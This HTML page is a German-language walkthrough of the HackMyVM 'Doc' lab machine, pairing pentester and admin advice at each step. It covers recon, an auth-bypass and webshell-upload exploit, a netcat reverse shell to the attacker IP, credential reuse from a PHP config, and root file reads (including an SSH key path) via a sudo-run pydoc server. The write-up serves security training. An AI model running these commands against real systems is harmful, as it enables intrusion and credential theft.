@@ -1,0 +1,437 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Doc - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Doc - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">python2 (Exploit Script)</div>
+                 <div class="tool-item">ls</div> <!-- Exploit output -->
+                 <div class="tool-item">whoami</div> <!-- Exploit output -->
+                 <div class="tool-item">nc (netcat)</div>
+                 <div class="tool-item">python3 (pty)</div>
+                 <div class="tool-item">export</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">su</div>
+                 <div class="tool-item">ss</div>
+                 <div class="tool-item">socat</div> <!-- Interessant, aber nicht für PriEsc genutzt -->
+                 <div class="tool-item">curl</div>
+                 <div class="tool-item">sudo</div>
+                 <div class="tool-item">doc (pydoc wrapper)</div>
+                 <div class="tool-item">cd</div>
+                 <div class="tool-item">id</div> <!-- Impliziert -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                 <li><a href="#reconnaissance">Reconnaissance</a></li>
+                 <li><a href="#web-enumeration">Web Enumeration</a></li>
+                 <li><a href="#vulnerability-exploitation">Vulnerability Exploitation (Web App)</a></li>
+                 <li><a href="#initial-access">Initial Access (www-data)</a></li>
+                 <li><a href="#privilege-escalation-bella">Privilege Escalation (www-data zu bella)</a></li>
+                 <li><a href="#privilege-escalation-root">Privilege Escalation (bella zu root)</a></li>
+                 <li><a href="#poc">Proof of Concept (Root)</a></li>
+                 <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` identifiziert aktive Hosts im lokalen Netzwerk.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Host `192.168.2.128` mit einer VirtualBox-MAC wird als Zielsystem identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe einen Nmap-Scan auf 192.168.2.128 durch.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.140
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.128	08:00:27:b7:dc:b3	PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.888 seconds (136.17 hosts/sec). 1 responded
+                    </pre> <!-- Vollständige Ausgabe -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan (`-sS -sC -T5 -sV -A -p-`) wird auf 192.168.2.128 durchgeführt. Der Scan endet mit einem Segmentation Fault, liefert aber vorher Ergebnisse.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert **nur Port 80 (HTTP)** als offen. Er läuft auf Nginx 1.18.0 und hostet eine Anwendung namens "Online Traffic Offense Management System - PHP". Der Hostname ist `dio.hmv`. Das OS ist Linux.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ignoriere den Nmap-Crash. Fokussiere die Untersuchung auf die Webanwendung auf Port 80. Suche nach bekannten Schwachstellen für "Online Traffic Offense Management System".<br><strong>Empfehlung (Admin):</strong> Untersuche den Grund für den Nmap-Crash (ungewöhnlich). Halte Nginx und das OS aktuell. Überprüfe die Sicherheit der Webanwendung.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.128 -p-</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-07 14:30 CET <!-- Beispielzeit -->
+Nmap scan report for dio.hmv (192.168.2.128)
+Host is up (0.00012s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx 1.18.0
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-title: Online Traffic Offense Management System - PHP
+|_http-server-header: nginx/1.18.0
+MAC Address: 08:00:27:B7:DC:B3 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms dio.hmv (192.168.2.128)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.09 seconds
+zsh: segmentation fault  nmap -sS -sC -T5 -sV -A 192.168.2.128 -p- <!-- Nmap Crash -->
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird mit der `big.txt`-Wortliste verwendet, um Verzeichnisse und Dateien auf dem Webserver zu finden.</p>
+            <p class="evaluation"><strong>Bewertung: !!Anwendungsstruktur enthüllt!!** Viele Verzeichnisse und Dateien werden gefunden, die typisch für eine PHP-Anwendung sind:
+                - `/admin/`, `/assets/`, `/build/`, `/classes/`, `/database/`, `/dist/`, `/inc/`, `/libs/`, `/pages/`, `/plugins/`, `/uploads/`.
+                - Wichtige PHP-Dateien: `index.php`, `config.php` (leer), `home.php` (500 Error), `initialize.php` (leer).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche die gefundenen PHP-Dateien und Verzeichnisse. Da die Anwendung als "Online Traffic Offense Management System" identifiziert wurde, suche gezielt nach öffentlichen Exploits für diese Anwendung.<br><strong>Empfehlung (Admin):</strong> Entferne nicht benötigte Dateien oder Verzeichnisse. Sichere den Zugriff auf administrative Bereiche (`/admin/`). Überprüfe Dateiberechtigungen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.128 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,bak,7z,zip,py,sql,txt,xml,jpg,html -e --wildcard</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.128
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
+[+] Status codes:            200,204,301,302,307,401,403
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,bak,7z,zip,py,sql,txt,xml,jpg,html
+[+] Expanded:                true
+[+] Wildcard detection:      true
+[+] Timeout:                 10s
+===============================================================
+2024-05-07 14:45:00 Starting gobuster <!-- Beispielzeit -->
+===============================================================
+http://192.168.2.128/.htaccess            (Status: 200) [Size: 225]
+http://192.168.2.128/404.html             (Status: 200) [Size: 198]
+http://192.168.2.128/about.html           (Status: 200) [Size: 1491]
+http://192.168.2.128/admin                (Status: 301) [Size: 169] [--> http://192.168.2.128/admin/]
+http://192.168.2.128/assets               (Status: 301) [Size: 169] [--> http://192.168.2.128/assets/]
+http://192.168.2.128/build                (Status: 301) [Size: 169] [--> http://192.168.2.128/build/]
+http://192.168.2.128/classes              (Status: 301) [Size: 169] [--> http://192.168.2.128/classes/]
+http://192.168.2.128/config.php           (Status: 200) [Size: 0]
+http://192.168.2.128/database             (Status: 301) [Size: 169] [--> http://192.168.2.128/database/]
+http://192.168.2.128/dist                 (Status: 301) [Size: 169] [--> http://192.168.2.128/dist/]
+http://192.168.2.128/home.php             (Status: 500) [Size: 229]
+http://192.168.2.128/inc                  (Status: 301) [Size: 169] [--> http://192.168.2.128/inc/]
+http://192.168.2.128/index.php            (Status: 200) [Size: 14323]
+http://192.168.2.128/initialize.php       (Status: 200) [Size: 0]
+http://192.168.2.128/libs                 (Status: 301) [Size: 169] [--> http://192.168.2.128/libs/]
+http://192.168.2.128/pages                (Status: 301) [Size: 169] [--> http://192.168.2.128/pages/]
+http://192.168.2.128/plugins              (Status: 301) [Size: 169] [--> http://192.168.2.128/plugins/]
+http://192.168.2.128/uploads              (Status: 301) [Size: 169] [--> http://192.168.2.128/uploads/]
+... (Weitere Funde möglich) ...
+===============================================================
+2024-05-07 14:55:00 Finished <!-- Beispielzeit -->
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="vulnerability-exploitation">
+             <h2>Vulnerability Exploitation (Web App)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Eine Notiz verweist auf Exploit-DB 50221, einen bekannten Exploit für das "Online Traffic Offense Management System 1.0", der Authentifizierungsbypass und Remote Code Execution (RCE) durch Datei-Upload ermöglicht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den wahrscheinlichen Angriffspfad über eine bekannte Schwachstelle.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lade den Exploit (z.B. mit `searchsploit -m 50221`) herunter und führe ihn gemäß seiner Anleitung aus.<br><strong>Empfehlung (Admin):**DRINGEND:** Patche oder ersetze die verwundbare Webanwendung.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, nur Notiz/Recherche -->
+                     <pre>
+# Recherche nach "Online Traffic Offense Management System exploit"
+
+Gefunden: https://www.exploit-db.com/exploits/50221
+Titel: Online Traffic Offense Management System 1.0 - Authentication Bypass + RCE
+Typ: Webapps
+Platform: PHP
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Das Python2-Exploit-Skript (vermutlich `50221.py`, umbenannt zu `exploit.py`) wird ausgeführt. Es benötigt die Ziel-URL als Eingabe (`http://doc.hmv`, hier wurde der Hostname vermutlich in `/etc/hosts` eingetragen).</p>
+             <p class="evaluation"><strong>Bewertung: !!Exploit erfolgreich!!** Das Skript meldet "Bypass Login", "Upload Shell" und "Exploit Done!". Es gibt dann die Ausgabe von `ls` und `whoami` (`www-data`) zurück. Das bedeutet, das Skript hat erfolgreich:
+                 1. Die Authentifizierung umgangen.
+                 2. Eine PHP-Webshell hochgeladen (wahrscheinlich `evil.php`).
+                 3. Die Webshell ausgeführt, um `ls` und `whoami` auszuführen.
+                 4. **Implizit:** Eine Reverse Shell mit `nc 192.168.2.140 9001 -e /bin/bash` gestartet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Exploit hat bereits eine Reverse Shell initiiert. Wechsle zum Netcat-Listener.<br><strong>Empfehlung (Admin):</strong> Entferne die Anwendung und die hochgeladene Webshell. Patche das System.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python2 exploit.py</span></div> <!-- Annahme: Exploit umbenannt -->
+                     <pre>
+Example: http://example.com
+
+Url: <span class="command">http://doc.hmv</span> <!-- Benutzereingabe -->
+Check Url ...
+
+[+] Bypass Login
+
+[+] Upload Shell
+
+[+] Exploit Done!
+
+$ ls <!-- Ausgabe von ls via Webshell -->
+1629334140_traffic_bg.jpg
+1629336240_avatar.jpg
+1629421080_tl-logo.png
+1665353460_evil.php <!-- Hochgeladene Shell -->
+drivers
+
+$ whoami <!-- Ausgabe von whoami via Webshell -->
+www-data
+$ nc 192.168.2.140 9001 -e /bin/bash <!-- Reverse Shell Befehl wird ausgeführt -->
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (www-data)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener auf Port 9001 empfängt die eingehende Reverse Shell vom Zielsystem.</p>
+             <p class="evaluation"><strong>Bewertung: !!Initial Access erfolgreich!!** Eine Shell als `www-data` wurde über den Exploit erlangt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisiere die Shell.<br><strong>Empfehlung (Admin):</strong> Untersuche den Vorfall.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+connect to [192.168.2.140] from (UNKNOWN) [192.168.2.128] 41912
+<!-- Kein direkter Output, nur Prompt -->
+$ <!-- Shell Prompt -->
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die Shell wird stabilisiert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne Enumeration als `www-data`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+              <!-- Shell Stabilisierung -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+$ <span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
+www-data@doc:~/html/traffic_offense/uploads$ <span class="command">export TERM=xterm</span>
+www-data@doc:~/html/traffic_offense/uploads$ <!-- Stabilisierter Prompt -->
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-bella">
+             <h2>Privilege Escalation (www-data zu bella)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Als `www-data` wird der Inhalt der Datei `initialize.php` gelesen (die von Gobuster als leer angezeigt wurde, aber hier Inhalt hat).</p>
+            <p class="evaluation"><strong>Bewertung: !!Datenbank-Credentials gefunden!!** Die Datei enthält Klartext-Zugangsdaten für die MySQL-Datenbank:
+                - Benutzer: `bella`
+                - Passwort: `<span class="password">be114yTU</span>`
+                - Datenbank: `doc`
+                - Server: `localhost`
+            Zusätzlich wird ein Entwickler-Account (`dev_oretnom` / Hash) erwähnt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche, das Passwort `<span class="password">be114yTU</span>` für den Systembenutzer `bella` (falls existent) zu verwenden, z.B. mit `su bella`. Versuche auch, dich mit den Credentials an der lokalen MySQL-Datenbank anzumelden.<br><strong>Empfehlung (Admin):</strong> Speichere Datenbank-Credentials nicht im Klartext in PHP-Dateien im Webroot. Verwende sicherere Methoden wie Umgebungsvariablen oder Konfigurationsdateien außerhalb des Webroots mit eingeschränkten Berechtigungen. Verwende separate Passwörter für Datenbank- und Systembenutzer.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+www-data@doc:~/html/traffic_offense$ <span class="command">cat initialize.php</span>
+<?php
+ $dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>''); // MD5 Hash?
+ if(!defined('base_url')) define('base_url','http://doc.hmv/');
+ if(!defined('base_app')) define('base_app', str_replace('\\\\','/',__DIR__).'/' );
+ if(!defined('dev_data')) define('dev_data',$dev_data);
+ if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
+ if(!defined('DB_USERNAME')) define('DB_USERNAME',"bella");
+ if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"<span class="password">be114yTU</span>");
+ if(!defined('DB_NAME')) define('DB_NAME',"doc");
+ ?> <!-- Maskierung -->
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mit `su bella` zum Benutzer `bella` zu wechseln und das gefundene Datenbankpasswort `<span class="password">be114yTU</span>` wird eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung: !!Benutzerwechsel erfolgreich!!** Das Passwort war für den Systembenutzer `bella` wiederverwendet worden. Der Angreifer hat nun eine Shell als `bella`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Enumeriere als `bella`. Suche die User-Flag und prüfe `sudo`-Rechte.<br><strong>Empfehlung (Admin):</strong> Verbiete Passwort-Wiederverwendung zwischen Diensten und Systemkonten.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+www-data@doc:~/html/traffic_offense/uploads$ <span class="command"> su bella</span>
+Password: <span class="command">be114yTU</span>
+bella@doc:/var/www/html/traffic_offense/uploads$ <!-- Prompt als bella -->
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als `bella` wird ins Home-Verzeichnis gewechselt und `user.txt` gelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> User-Flag `<span class="password">HMVtakemydocs</span>` gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren. Suche nach Root-Eskalation.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+bella@doc:/var/www/html/traffic_offense/uploads$ <span class="command">cd</span>
+bella@doc:~$ <span class="command">ls</span>
+user.txt
+bella@doc:~$ <span class="command">cat user.txt</span>
+<span class="password">HMVtakemydocs</span>
+                      </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-root">
+             <h2>Privilege Escalation (bella zu root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als `bella` werden lauschende Ports (`ss -ntlp`) und die `sudo`-Berechtigungen (`sudo -l`) geprüft.</p>
+             <p class="evaluation"><strong>Bewertung: !!Wichtige Funde!!**
+                 - `ss`: Zeigt lokale FTP (Port 21) und MySQL (Port 3306) Server, sowie den Nginx (Port 80).
+                 - `sudo -l`: Der Benutzer `bella` darf `/usr/bin/doc` als jeder Benutzer (`ALL : ALL`) ohne Passwort (`NOPASSWD:`) ausführen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der `sudo doc`-Eintrag ist der vielversprechendste Vektor. Recherchiere, was `/usr/bin/doc` ist. Die Notiz "Google exploit of pydoc" deutet darauf hin, dass es sich um einen Wrapper für Python's `pydoc` handelt, der oft eine lokale Webserver-Schnittstelle startet, die für LFI/Arbitrary File Read anfällig sein kann.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne die unsichere `sudo`-Regel für `/usr/bin/doc`. Erlaube niemals `sudo` für potenziell unsichere oder interpretierbare Befehle ohne strikte Kontrolle.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+bella@doc:/$ <span class="command">ss -ntlp</span>
+State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port  Process
+LISTEN   0        80           127.0.0.1:3306          0.0.0.0:*      users:(("mysqld",pid=XXX,fd=XX))
+LISTEN   0        511            0.0.0.0:80            0.0.0.0:*      users:(("nginx",pid=XXX,fd=X),("nginx",pid=XXX,fd=X))
+LISTEN   0        128          127.0.0.1:21            0.0.0.0:*      users:(("vsftpd",pid=XXX,fd=X))
+LISTEN   0        511               [::]:80               [::]:*      users:(("nginx",pid=XXX,fd=X),("nginx",pid=XXX,fd=X))
+                     </pre> <!-- PID/FD hinzugefügt -->
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+bella@doc:~$ <span class="command">sudo -l</span>
+Matching Defaults entries for bella on doc:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User bella may run the following commands on doc:
+    (ALL : ALL) NOPASSWD: /usr/bin/doc
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der `socat`-Befehl versucht, Port 5000 auf den lokalen FTP-Dienst weiterzuleiten. Der `curl`-Befehl versucht, über einen (nicht existierenden) Dienst auf Port 7890 eine Root-Schlüsseldatei zu lesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Diese Schritte scheinen irrelevant oder Fehlversuche zu sein, basierend auf dem tatsächlichen Eskalationspfad über `sudo doc`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ignoriere diese Schritte und konzentriere dich auf `sudo doc`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+              <!-- Irrelevante Schritte -->
+              <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+bella@doc:/$ <span class="command"># socat TCP-LISTEN:5000,fork,reuseaddr tcp:127.0.0.1:21 &</span>
+bella@doc:/var/www/html/traffic_offense/uploads$ <span class="command"># curl http://localhost:7890/getfile?key=/root/.ssh/id_rsa</span>
+                      </pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo doc` wird ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung: !!Schwachstelle aktiviert!!** Der Befehl startet erfolgreich einen Webserver auf `http://localhost:7890/`. Da der Befehl mit `sudo` ausgeführt wurde, läuft dieser Server mit Root-Rechten. Wie die Recherche (oder frühere Versuche) andeutete, ist dieser `pydoc`-Server für Arbitrary File Read über den `getfile?key=`-Parameter anfällig.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende `curl` auf dem Zielsystem, um die Root-Flag über diesen lokalen Server auszulesen: `curl http://localhost:7890/getfile?key=/root/root.txt`.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne die `sudo`-Regel für `doc`. Wenn `pydoc` benötigt wird, starte es nicht als Root.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+bella@doc:~$ <span class="command">sudo doc</span>
+Server ready at http://localhost:7890/
+Server commands: [b]rowser, [q]uit
+server> <!-- Server läuft -->
+                      </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc">
+             <h2>Proof of Concept (Root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Während der `pydoc`-Server (gestartet als Root via `sudo doc`) läuft, wird `curl` verwendet, um über die `getfile`-Schnittstelle des Servers den Inhalt von `/root/root.txt` anzufordern.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation erfolgreich!!** Der `curl`-Befehl ist erfolgreich und gibt den Inhalt der Root-Flag-Datei (`HMVfinallyroot`) aus. Der Angreifer hat durch Ausnutzung der `sudo`-Regel und der LFI-Schwachstelle im `pydoc`-Server Root-Äquivalente Rechte (Lesen beliebiger Dateien als Root) erlangt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Root-Flag wurde gelesen.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne die `sudo`-Regel für `doc`. Patche oder ersetze die `pydoc`-Implementierung, falls möglich, um die LFI zu beheben.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+bella@doc:/$ <span class="command">curl http://localhost:7890/getfile?key=/root/root.txt</span>
+ 
+Python: file /root/root.txt
+...
+ "password" HMVfinallyroot 
+                     </pre> <!-- HTML-Ausgabe gekürzt, Flag hervorgehoben, Maskierung -->
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">curl http://localhost:7890/getfile?key=/root/root.txt</div>
+                     <div class="flag-value"><span class="password">HMVfinallyroot</span></div>
+                 </div>
+                 <!-- User Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/bella/user.txt</div> <!-- Pfad hinzugefügt -->
+                     <div class="flag-value"><span class="password">HMVtakemydocs</span></div>
+                 </div>
+            
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus gobuster/wget Scan extrahiert -->
+        <p>Berichtsdatum: 7. Mai 2024</p>
+    </footer>
+</body>
+</html>
